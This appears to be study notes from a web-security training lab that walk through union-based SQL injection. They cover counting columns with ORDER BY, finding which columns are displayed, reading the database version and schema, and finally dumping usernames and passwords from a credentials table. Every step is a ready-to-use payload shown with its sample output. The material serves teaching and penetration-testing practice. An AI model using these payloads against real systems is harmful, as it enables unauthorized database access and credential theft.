Union-based SQL Injection allows attackers to extract data by combining results from multiple queries using the `UNION` operator.

## **1. Detecting the Number of Columns**

Before performing a **Union-based injection**, we need to determine how many columns exist in the target query. There are **two methods** to do this:

### **Method 1: Using ORDER BY**

1. Start with `ORDER BY 1` and keep increasing the number until an error occurs.
2. The last successful number before an error indicates the **total number of columns**.

**Example Queries:**
```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
' ORDER BY 4-- -
' ORDER BY 5-- -  (Error: Unknown column '5' in 'order clause')
```

**Conclusion:**  
Since `ORDER BY 4` worked but `ORDER BY 5` caused an error, the table has **4 columns**.

---
### **Method 2: Using UNION**

1. Start with a `UNION SELECT` query with a guessed number of columns.
2. If an error occurs (`The used SELECT statements have a different number of columns`), increase the number until the query works.

**Example Queries:**
```sql
cn' UNION SELECT 1,2,3-- -  (Error: Column mismatch)
cn' UNION SELECT 1,2,3,4-- -  (Success: Returns values)
```

**Conclusion:**  
The query worked with **4 columns**, confirming the number of columns.

## **2. Identifying Visible Columns**

Even though the query may return multiple columns, **not all of them may be displayed** on the page. It is important to find **which columns print data to the page**.

1. Use the **numbered payload** (e.g., `UNION SELECT 1,2,3,4`).
2. Observe which numbers appear in the web application’s output.

**Example Output:**

- The web application displays: `2, 3, 4`
- **Column 1 is not displayed**, meaning **injections should be placed in columns 2, 3, or 4**.

---
## **3. Testing Data Extraction**

Once we know which columns are displayed, test extracting **database information** using known SQL functions.

**Example: Getting the Database Version**
```sql
cn' UNION SELECT 1,@@version,3,4-- -
```
Output:
```sql
10.3.22-MariaDB-1ubuntu1, 3, 4
```
- This confirms that column **2 prints output**, making it a good place to extract data.

## **4. Practical Union Injection Workflow**

**Step 1: Find the Number of Columns**
```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
' ORDER BY 4-- -
' ORDER BY 5-- -  (Error)
```
→ **Total columns: 4**

**Step 2: Check Which Columns Are Visible**
```sql
cn' UNION SELECT 1,@@version,3,4-- -
```
→ **Columns displayed: 2, 3, 4**  
(Do not use column 1 for injection, as it is hidden.)

**Step 3: Extract Database Version**
```sql
cn' UNION SELECT 1,@@version,3,4-- -
```
→ **Output:** `10.3.22-MariaDB-1ubuntu1`

**Step 4: Extract Database Name**
```sql
cn' UNION SELECT 1,database(),3,4-- -
```
→ **Output:** `ilfreight`

**Step 5: Extract Database Names**
```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```
→ **Output:** `ilfreight`, `dev`

**Step 6: Extract Table Names**
```sql
cn' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='dev'-- -
```
→ **Output:** `credentials, framework, pages, posts`

**Step 7: Extract Column Names from a Table**
```sql
cn' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='credentials'-- -
```
→ **Output:** `username, password`

**Step 8: Dump Data from Table**
```sql
cn' UNION SELECT 1, username, password, 4 FROM dev.credentials-- -
```
→ **Output:**
```
admin | hashed_password  
dev_admin | hashed_password  
api_key | hashed_value
```
